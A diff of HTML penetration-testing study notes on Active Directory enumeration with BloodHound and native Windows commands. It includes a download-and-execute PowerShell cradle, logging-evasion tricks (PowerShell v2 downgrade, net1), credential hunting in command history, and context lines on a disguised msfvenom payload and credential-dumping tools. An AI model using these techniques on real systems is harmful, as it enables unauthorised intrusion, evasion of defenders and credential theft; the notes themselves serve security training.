+<h3 id="run-sharphound"><a class="header" href="#run-sharphound">Run SharpHound</a></h3>
+<pre><code class="language-powershell">.\SharpHound.exe -c All --zipfilename ILFREIGHT
+</code></pre>
+<h3 id="key-sharphound-flags"><a class="header" href="#key-sharphound-flags">Key SharpHound Flags</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-c</code></td><td>Collection methods (Default, All, DCOnly, Session, LoggedOn, Group, ACL, etc.)</td></tr>
+<tr><td><code>-d</code></td><td>Target domain</td></tr>
+<tr><td><code>-s</code> / <code>--searchforest</code></td><td>Search all domains in the forest</td></tr>
+<tr><td><code>--stealth</code></td><td>Stealth collection (prefer DCOnly)</td></tr>
+<tr><td><code>--zipfilename</code></td><td>Output zip file name</td></tr>
+<tr><td><code>--computerfile</code></td><td>File with specific computer targets</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="load-data-into-bloodhound"><a class="header" href="#load-data-into-bloodhound">Load Data into BloodHound</a></h3>
+<pre><code class="language-bash">sudo neo4j start
+bloodhound
+</code></pre>
+<ol>
+<li>Click “Upload Data” button</li>
+<li>Select the zip file from SharpHound</li>
+<li>Wait for all JSON files to show 100% complete</li>
+</ol>
+<h3 id="useful-built-in-queries"><a class="header" href="#useful-built-in-queries">Useful Built-in Queries</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Query</th><th>What It Reveals</th></tr>
+</thead>
+<tbody>
+<tr><td>Find Shortest Paths to Domain Admins</td><td>Attack paths to DA</td></tr>
+<tr><td>Find Computers with Unsupported OS</td><td>Legacy systems (Win7, Server 2008) — validate if live</td></tr>
+<tr><td>Find Computers where Domain Users are Local Admin</td><td>Over-permissioned hosts — any domain user can access</td></tr>
+<tr><td>Find Principals with DCSync Rights</td><td>Users that can perform DCSync</td></tr>
+<tr><td>Find Kerberoastable Accounts</td><td>SPNs set on user accounts</td></tr>
+<tr><td>Shortest Paths from Owned Principals</td><td>Paths from compromised nodes</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="bloodhound-workflow-tips"><a class="header" href="#bloodhound-workflow-tips">BloodHound Workflow Tips</a></h3>
+<ul>
+<li>Mark compromised users/computers as “Owned” to find paths from current position</li>
+<li>Unsupported OS hosts may not be live — validate before reporting</li>
+<li>Domain Users as local admin on any host = any account can be used for access</li>
+<li>Always document files transferred to/from hosts and clean up at engagement end</li>
+</ul>
+<h2 id="summary-2"><a class="header" href="#summary-2">Summary</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Type</th><th>Best For</th></tr>
+</thead>
+<tbody>
+<tr><td>AD PowerShell Module</td><td>Built-in</td><td>Stealthy enumeration — blends with admin activity</td></tr>
+<tr><td>PowerView</td><td>PowerShell script</td><td>Deep AD enumeration — users, groups, ACLs, trusts, shares</td></tr>
+<tr><td>SharpView</td><td>.NET executable</td><td>Same as PowerView when PowerShell is restricted</td></tr>
+<tr><td>Snaffler</td><td>.NET executable</td><td>Hunting credentials and sensitive files in shares</td></tr>
+<tr><td>SharpHound</td><td>.NET executable</td><td>Collecting AD data for BloodHound visualization</td></tr>
+<tr><td>BloodHound</td><td>GUI</td><td>Visualizing attack paths and relationships</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="living-off-the-land"><a class="header" href="#living-off-the-land">Living Off the Land</a></h1>
+<p>Techniques for AD enumeration using only native Windows tools and commands — no imported tools required. Useful when you cannot load tools onto a managed host, have no internet access, or need to stay stealthy. Native commands generate fewer logs and alerts compared to pulling offensive tools into the environment.</p>
+<h2 id="host--network-reconnaissance"><a class="header" href="#host--network-reconnaissance">Host &amp; Network Reconnaissance</a></h2>
+<h3 id="basic-enumeration-commands"><a class="header" href="#basic-enumeration-commands">Basic Enumeration Commands</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Result</th></tr>
+</thead>
+<tbody>
+<tr><td><code>hostname</code></td><td>PC name</td></tr>
+<tr><td><code>[System.Environment]::OSVersion.Version</code></td><td>OS version and revision</td></tr>
+<tr><td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td><td>Patches and hotfixes</td></tr>
+<tr><td><code>ipconfig /all</code></td><td>Network adapter config</td></tr>
+<tr><td><code>set</code></td><td>Environment variables (CMD)</td></tr>
+<tr><td><code>echo %USERDOMAIN%</code></td><td>Domain name (CMD)</td></tr>
+<tr><td><code>echo %logonserver%</code></td><td>Domain controller name (CMD)</td></tr>
+<tr><td><code>systeminfo</code></td><td>All of the above in one command (fewer logs)</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="network-enumeration"><a class="header" href="#network-enumeration">Network Enumeration</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>arp -a</code></td><td>Known hosts in ARP table — reveals local network hosts</td></tr>
+<tr><td><code>ipconfig /all</code></td><td>Adapter settings and network segment</td></tr>
+<tr><td><code>route print</code></td><td>Routing table — known networks and potential lateral movement paths</td></tr>
+<tr><td><code>netsh advfirewall show allprofiles</code></td><td>Firewall status for all profiles (Domain/Private/Public)</td></tr>
+</tbody>
+</table>
+</div>
+<p>Networks in the routing table are potential lateral movement targets — they’re either actively used or administratively configured.</p>
+<h3 id="check-who-else-is-logged-in"><a class="header" href="#check-who-else-is-logged-in">Check Who Else is Logged In</a></h3>
+<pre><code class="language-powershell">qwinsta
+</code></pre>
+<p>Always check before taking action — if another user notices unusual activity, they may report it or change their password.</p>
+<h2 id="powershell-techniques"><a class="header" href="#powershell-techniques">PowerShell Techniques</a></h2>
+<h3 id="useful-cmdlets"><a class="header" href="#useful-cmdlets">Useful Cmdlets</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Cmdlet</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>Get-Module</code></td><td>List loaded modules (check for AD module, custom scripts)</td></tr>
+<tr><td><code>Get-ExecutionPolicy -List</code></td><td>Execution policy per scope</td></tr>
+<tr><td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td><td>Bypass execution policy for current process only (reverts on exit)</td></tr>
+<tr><td><code>Get-ChildItem Env: | ft Key,Value</code></td><td>Environment variables</td></tr>
+<tr><td><code>Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></td><td>PowerShell command history (may contain passwords)</td></tr>
+<tr><td><code>powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL')"</code></td><td>Download and execute from memory</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="powershell-downgrade-for-evasion"><a class="header" href="#powershell-downgrade-for-evasion">PowerShell Downgrade for Evasion</a></h3>
+<p>PowerShell event logging (Script Block Logging) was introduced in PowerShell 3.0. Downgrading to version 2.0 disables logging for that session:</p>
+<pre><code class="language-powershell">powershell.exe -version 2
+Get-host   # Verify version shows 2.0
+</code></pre>
+<p><strong>Caveats:</strong></p>
+<ul>
+<li>The command <code>powershell.exe -version 2</code> itself <strong>is logged</strong></li>
+<li>After downgrade, no further Script Block Logging entries are created</li>
+<li>A vigilant defender may notice logging gaps and investigate</li>
+<li>Requires .NET Framework 2.0 to be installed on the host</li>
+</ul>
+<h2 id="checking-defenses"><a class="header" href="#checking-defenses">Checking Defenses</a></h2>
+<h3 id="firewall-status"><a class="header" href="#firewall-status">Firewall Status</a></h3>
+<pre><code class="language-powershell">netsh advfirewall show allprofiles
+</code></pre>
+<p>Check the <code>State</code> field — <code>ON</code> or <code>OFF</code> for each profile (Domain, Private, Public).</p>
+<h3 id="windows-defender-1"><a class="header" href="#windows-defender-1">Windows Defender</a></h3>
+<pre><code class="language-cmd">sc query windefend
+</code></pre>
+<pre><code class="language-powershell">Get-MpComputerStatus
+</code></pre>
+<p>Key fields: <code>RealTimeProtectionEnabled</code>, <code>AntivirusEnabled</code>, <code>BehaviorMonitorEnabled</code>, <code>IsTamperProtected</code>, scan schedules, signature age.</p>
+<h2 id="wmi-windows-management-instrumentation"><a class="header" href="#wmi-windows-management-instrumentation">WMI (Windows Management Instrumentation)</a></h2>
+<p>Scripting engine for retrieving system info from local and remote hosts.</p>
+<h3 id="useful-wmi-commands"><a class="header" href="#useful-wmi-commands">Useful WMI Commands</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td><td>Patch level</td></tr>
+<tr><td><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</code></td><td>Host info</td></tr>
+<tr><td><code>wmic process list /format:list</code></td><td>Running processes</td></tr>
+<tr><td><code>wmic ntdomain list /format:list</code></td><td>Domain and DC info (includes trusts)</td></tr>
+<tr><td><code>wmic useraccount list /format:list</code></td><td>Local and domain accounts that have logged in</td></tr>
+<tr><td><code>wmic group list /format:list</code></td><td>Local groups</td></tr>
+<tr><td><code>wmic sysaccount list /format:list</code></td><td>System/service accounts</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="domain-and-trust-enumeration-via-wmi-1"><a class="header" href="#domain-and-trust-enumeration-via-wmi-1">Domain and Trust Enumeration via WMI</a></h3>
+<pre><code class="language-powershell">wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+</code></pre>
+<p>Reveals the current domain, child domains, and external forest trusts with DC addresses.</p>
+<h2 id="net-commands"><a class="header" href="#net-commands">Net Commands</a></h2>
+<p>Built-in commands for user, group, host, and share enumeration. <strong>Note:</strong> <code>net.exe</code> commands are commonly monitored by EDR — use with caution.</p>
+<h3 id="evasion-tip"><a class="header" href="#evasion-tip">Evasion Tip</a></h3>
+<p>Use <code>net1</code> instead of <code>net</code> — executes the same functions but may avoid string-based detection triggers:</p>
+<pre><code class="language-cmd">net1 user /domain
+net1 group /domain
+</code></pre>
+<h3 id="key-commands"><a class="header" href="#key-commands">Key Commands</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>net accounts /domain</code></td><td>Password and lockout policy</td></tr>
+<tr><td><code>net user /domain</code></td><td>All domain users</td></tr>
+<tr><td><code>net user &lt;username&gt; /domain</code></td><td>Specific user details</td></tr>
+<tr><td><code>net group /domain</code></td><td>All domain groups</td></tr>
+<tr><td><code>net group "Domain Admins" /domain</code></td><td>DA members</td></tr>
+<tr><td><code>net group "domain computers" /domain</code></td><td>Domain-joined computers</td></tr>
+<tr><td><code>net group "Domain Controllers" /domain</code></td><td>DCs</td></tr>
+<tr><td><code>net localgroup</code></td><td>All local groups</td></tr>
+<tr><td><code>net localgroup administrators</code></td><td>Local admin members</td></tr>
+<tr><td><code>net share</code></td><td>Current shares</td></tr>
+<tr><td><code>net view</code></td><td>List of domain computers</td></tr>
+<tr><td><code>net view /domain</code></td><td>Shares on the domain</td></tr>
+<tr><td><code>net view \\computer /ALL</code></td><td>All shares on a computer</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="dsquery"><a class="header" href="#dsquery">Dsquery</a></h2>
+<p>Command-line tool for querying AD objects. Available on any host with AD Domain Services Role installed. The <code>dsquery.dll</code> exists on all modern Windows systems at <code>C:\Windows\System32\dsquery.dll</code>. Requires elevated privileges or SYSTEM context.</p>
+<h3 id="basic-queries-1"><a class="header" href="#basic-queries-1">Basic Queries</a></h3>
+<pre><code class="language-powershell">dsquery user
+dsquery computer
+dsquery group
+dsquery ou
+</code></pre>
+<h3 id="wildcard-search-list-all-objects-in-an-ou"><a class="header" href="#wildcard-search-list-all-objects-in-an-ou">Wildcard Search (List All Objects in an OU)</a></h3>
+<pre><code class="language-powershell">dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+</code></pre>
+<h3 id="ldap-filter-queries"><a class="header" href="#ldap-filter-queries">LDAP Filter Queries</a></h3>
+<h4 id="users-with-passwd_notreqd-flag"><a class="header" href="#users-with-passwd_notreqd-flag">Users with PASSWD_NOTREQD Flag</a></h4>
+<pre><code class="language-powershell">dsquery * -filter "(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+</code></pre>
+<h4 id="find-domain-controllers"><a class="header" href="#find-domain-controllers">Find Domain Controllers</a></h4>
+<pre><code class="language-powershell">dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+</code></pre>
+<h3 id="ldap-oid-matching-rules"><a class="header" href="#ldap-oid-matching-rules">LDAP OID Matching Rules</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>OID</th><th>Rule</th><th>Use Case</th></tr>
+</thead>
+<tbody>
+<tr><td><code>1.2.840.113556.1.4.803</code></td><td>Bitwise AND — all bits must match</td><td>Match a single specific attribute</td></tr>
+<tr><td><code>1.2.840.113556.1.4.804</code></td><td>Bitwise OR — any bit match</td><td>Match any of several attributes</td></tr>
+<tr><td><code>1.2.840.113556.1.4.1941</code></td><td>Chain match (LDAP_MATCHING_RULE_IN_CHAIN)</td><td>Search through DN ownership/membership</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="ldap-logical-operators"><a class="header" href="#ldap-logical-operators">LDAP Logical Operators</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Operator</th><th>Meaning</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>&amp;</code></td><td>AND</td><td><code>(&amp;(objectClass=user)(adminCount=1))</code></td></tr>
+<tr><td><code>|</code></td><td>OR</td><td><code>(|(objectClass=user)(objectClass=computer))</code></td></tr>
+<tr><td><code>!</code></td><td>NOT</td><td><code>(&amp;(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))</code></td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="common-uac-bitmask-values"><a class="header" href="#common-uac-bitmask-values">Common UAC Bitmask Values</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Decimal</th><th>Hex</th><th>Attribute</th></tr>
+</thead>
+<tbody>
+<tr><td>2</td><td>0x0002</td><td>Account is disabled</td></tr>
+<tr><td>8</td><td>0x0008</td><td>Home directory required</td></tr>
+<tr><td>16</td><td>0x0010</td><td>Account locked out</td></tr>
+<tr><td>32</td><td>0x0020</td><td>Password not required</td></tr>
+<tr><td>64</td><td>0x0040</td><td>Password can’t change</td></tr>
+<tr><td>512</td><td>0x0200</td><td>Normal account</td></tr>
+<tr><td>8192</td><td>0x2000</td><td>Server trust account (Domain Controller)</td></tr>
+<tr><td>65536</td><td>0x10000</td><td>Password doesn’t expire</td></tr>
+<tr><td>4194304</td><td>0x400000</td><td>Don’t require pre-auth (AS-REP roastable)</td></tr>
+<tr><td>524288</td><td>0x80000</td><td>Trusted for delegation</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="summary-3"><a class="header" href="#summary-3">Summary</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Type</th><th>Best For</th></tr>
+</thead>
+<tbody>
+<tr><td><code>systeminfo</code></td><td>Built-in</td><td>Quick host overview in one command</td></tr>
+<tr><td>PowerShell cmdlets</td><td>Built-in</td><td>Module discovery, environment enum, history pillaging</td></tr>
+<tr><td>PS downgrade (v2)</td><td>Evasion</td><td>Bypass Script Block Logging</td></tr>
+<tr><td><code>netsh</code> / <code>sc</code></td><td>Built-in</td><td>Firewall and Defender status</td></tr>
+<tr><td>WMI (<code>wmic</code>)</td><td>Built-in</td><td>Domain/trust/process/user enumeration</td></tr>
+<tr><td><code>net</code> / <code>net1</code></td><td>Built-in</td><td>User, group, share, policy enumeration</td></tr>
+<tr><td><code>dsquery</code></td><td>Built-in</td><td>LDAP-based AD queries with filter support</td></tr>
+<tr><td><code>qwinsta</code></td><td>Built-in</td><td>Check for other logged-in users</td></tr>
+<tr><td><code>arp -a</code> / <code>route print</code></td><td>Built-in</td><td>Network discovery and lateral movement paths</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-file-transfer-methods"><a class="header" href="#linux-file-transfer-methods">Linux File Transfer Methods</a></h1>
 <h2 id="introduction-29"><a class="header" href="#introduction-29">Introduction</a></h2>
 <p>Linux provides many versatile tools for file transfers. Understanding these methods helps both attackers and defenders. Most malware uses HTTP/HTTPS for communication, though Linux also supports FTP, SMB, and other protocols.</p>
@@ -20908,7 +21987,7 @@ sudo mount -t cifs //&lt;IP&gt;/sharename /mnt/smb -o username=user
 cp file.txt /mnt/smb/
 sudo umount /mnt/smb
 </code></pre>
-<h2 id="summary"><a class="header" href="#summary">Summary</a></h2>
+<h2 id="summary-4"><a class="header" href="#summary-4">Summary</a></h2>
 <ul>
 <li><strong>Base64</strong>: No network needed, limited by terminal/paste buffer size</li>
 <li><strong>HTTP/HTTPS</strong>: Most common, multiple tools (curl, wget, Python), often allowed outbound</li>
@@ -21043,7 +22122,7 @@ echo PUT &lt;file&gt; &gt;&gt; ftpcommand.txt
 echo bye &gt;&gt; ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 </code></pre>
-<h2 id="summary-1"><a class="header" href="#summary-1">Summary</a></h2>
+<h2 id="summary-5"><a class="header" href="#summary-5">Summary</a></h2>
 <ul>
 <li><strong>Base64</strong>: No network needed, limited by terminal length</li>
 <li><strong>PowerShell WebClient</strong>: HTTP/HTTPS, most common, supports fileless execution</li>
@@ -21735,7 +22814,7 @@ Thus using an <strong>ACK scan</strong> (-sA) might be a good idea because the f
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-authentication"><a class="header" href="#linux-authentication">Linux Authentication</a></h1>
-<h2 id="summary-2"><a class="header" href="#summary-2">Summary</a></h2>
+<h2 id="summary-6"><a class="header" href="#summary-6">Summary</a></h2>
 <p>Linux uses Pluggable Authentication Modules (PAM) for authentication. The key modules (<code>pam_unix.so</code>, <code>pam_unix2.so</code>) are located in <code>/usr/lib/x86_64-linux-gnu/security/</code> on Debian-based systems. PAM handles user information, authentication, sessions, and password changes.</p>
 <h3 id="key-files-1"><a class="header" href="#key-files-1">Key Files</a></h3>
 <div class="table-wrapper">
@@ -35165,7 +36244,7 @@ pip3 install -r requirements.txt
 python3 laZagne.py all
 </code></pre>
 <hr>
-<h2 id="basic-usage-6"><a class="header" href="#basic-usage-6">Basic Usage</a></h2>
+<h2 id="basic-usage-7"><a class="header" href="#basic-usage-7">Basic Usage</a></h2>
 <h3 id="extract-all-credentials"><a class="header" href="#extract-all-credentials">Extract All Credentials</a></h3>
 <pre><code class="language-bash"># Windows
 laZagne.exe all
@@ -36751,7 +37830,7 @@ msf6 &gt; jobs -K
 <li><strong>pypykatz</strong>: Python implementation (cross-platform)</li>
 </ul>
 <hr>
-<h2 id="basic-usage-7"><a class="header" href="#basic-usage-7">Basic Usage</a></h2>
+<h2 id="basic-usage-8"><a class="header" href="#basic-usage-8">Basic Usage</a></h2>
 <h3 id="enable-debug-privileges"><a class="header" href="#enable-debug-privileges">Enable Debug Privileges</a></h3>
 <pre><code>privilege::debug
 </code></pre>
@@ -37078,7 +38157,7 @@ x86/shikata_ga_nai chosen with final size 135
 Payload size: 135 bytes
 Saved as: /home/user/Desktop/TeamViewer_Setup.exe
 </code></pre>
-<h4 id="key-flags-1"><a class="header" href="#key-flags-1">Key Flags</a></h4>
+<h4 id="key-flags-2"><a class="header" href="#key-flags-2">Key Flags</a></h4>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -37456,7 +38535,7 @@ cd pypykatz
 pip3 install .
 </code></pre>
 <hr>
-<h2 id="basic-usage-8"><a class="header" href="#basic-usage-8">Basic Usage</a></h2>
+<h2 id="basic-usage-9"><a class="header" href="#basic-usage-9">Basic Usage</a></h2>
 <h3 id="parse-lsass-memory-dump"><a class="header" href="#parse-lsass-memory-dump">Parse LSASS Memory Dump</a></h3>
 <pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
 </code></pre>
@@ -37670,7 +38749,7 @@ NTLM: aad3b435b51404eeaad3b435b51404ee
 </code></pre>
 <p>Compile with Visual Studio or use pre-compiled versions from various pentesting resources.</p>
 <hr>
-<h2 id="basic-usage-9"><a class="header" href="#basic-usage-9">Basic Usage</a></h2>
+<h2 id="basic-usage-10"><a class="header" href="#basic-usage-10">Basic Usage</a></h2>
 <h3 id="dump-all-tickets-1"><a class="header" href="#dump-all-tickets-1">Dump All Tickets</a></h3>
 <pre><code class="language-cmd">Rubeus.exe dump /nowrap
 </code></pre>
